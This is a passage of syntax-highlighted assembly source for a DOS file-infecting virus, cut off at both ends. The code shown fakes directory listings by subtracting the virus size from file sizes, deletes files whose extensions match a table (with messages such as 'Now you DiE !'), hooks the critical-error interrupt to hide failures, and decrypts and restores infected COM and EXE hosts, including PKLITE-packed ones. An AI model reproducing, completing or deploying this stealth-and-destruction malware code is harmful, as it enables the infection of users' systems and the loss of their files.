                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">restore_size</span><span class="sc0">            </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_fffn</span><span class="sc0">

</span><span class="sc5">restore_size</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
                                        </span><span class="sc1">;  sub es:[bx+1Ah],VIRUS_SIZE</span><span class="sc0">
                                        </span><span class="sc1">;  sbb es:[bx+1Ch],0 ?? ;)</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">cross_64k</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_cross_64k</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">cross_64k</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">no_cross_64k</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_table_ext</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I''m the invisible man'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">check_table_ext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">table_ext</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">          </span><span class="sc1">; Point to filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">next_char_fname</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; End of filename?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cmp_dot</span><span class="sc0">         </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_fffn</span><span class="sc0">

</span><span class="sc5">cmp_dot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">; Extension?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_extension</span><span class="sc0"> </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_char_fname</span><span class="sc0">

</span><span class="sc5">found_extension</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Point to extension</span><span class="sc0">
</span><span class="sc5">l_next_extension</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Extension in table?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cmp_last_ext</span><span class="sc0">    </span><span class="sc1">; Maybe? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; End of table?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_fffn</span><span class="sc0">       </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Next</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_next_extension</span><span class="sc0">

</span><span class="sc5">cmp_last_ext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Extension in table?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_kill_file</span><span class="sc0">   </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_next_extension</span><span class="sc0">

</span><span class="sc5">jmp_kill_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">kill_file</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Now you DiE !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">kill_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Read &amp; store int 24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i24</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i24</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_24</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">  </span><span class="sc1">; Set new int 24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">                  </span><span class="sc1">; Delete file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i24</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">      </span><span class="sc1">; Restore int 24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i24</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A898h</span><span class="sc0">       </span><span class="sc1">; Return 'shit !',0 in russian</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20E2h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc0">          </span><span class="sc1">; '!',0</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_fffn</span><span class="sc0">       </span><span class="sc1">; Stupid jmp!!!</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">exit_fffn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">clc</span><span class="sc0"> 
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_21h</span><span class="sc0">

</span><span class="sc5">exit_fffn_preserve_AX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">returnAX_fffn</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Preserve AX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">returnAX_fffn</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">        </span><span class="sc1">; Return AX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_21h</span><span class="sc0">

</span><span class="sc5">popregs_iret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">ofs_i24</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i24</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">restore_exec_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">host_type</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; EXE?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">restore_exe</span><span class="sc0">             </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                             </span><span class="sc1">; It's COM</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">encrypted_byte?</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; Byte encrypted?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">decrypt_byte190</span><span class="sc0">                 </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">103h</span><span class="sc0">         </span><span class="sc1">; Initial call return address</span><span class="sc0">
                                        </span><span class="sc1">; If not encrypted it starts with 'call'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_com</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">decrypt_byte190</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">encrypted_byte</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">                  </span><span class="sc1">; Decrypt byte</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">190h</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Restore code in memory</span><span class="sc0">
</span><span class="sc5">restore_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">jmp_dest</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; Host entry point</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; Remove virus from memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">delmem_here</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">remove_from_memory</span><span class="sc0">
</span><span class="sc5">delmem_here</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">restore_exe</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">restore_exe</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">remove_from_memory</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Return to host</span><span class="sc0">

</span><span class="sc5">remove_from_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">l_del_mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'#'</span><span class="sc0">    </span><span class="sc1">; Remove copy virus from memory</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_del_mem</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'All dead...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">restore_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">512</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc2">7Eh</span><span class="sc0">      </span><span class="sc1">; Decrypt byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">pklite_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Pklited file?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_pk_host_exe</span><span class="sc0">          </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0Dh</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">     </span><span class="sc1">; Remove patch</span><span class="sc0">

</span><span class="sc5">no_pk_host_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; Add PSP</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">_reloss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Relocate segments</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">_relocs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">_exeip</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">_relocs</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">_exesp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_sp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">_reloss</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_ss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">delmem_here</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc1">; offset(delmem_here2) !!!</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">remove_from_memory</span><span class="sc0">
</span><span class="sc1">;delmem_here2:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
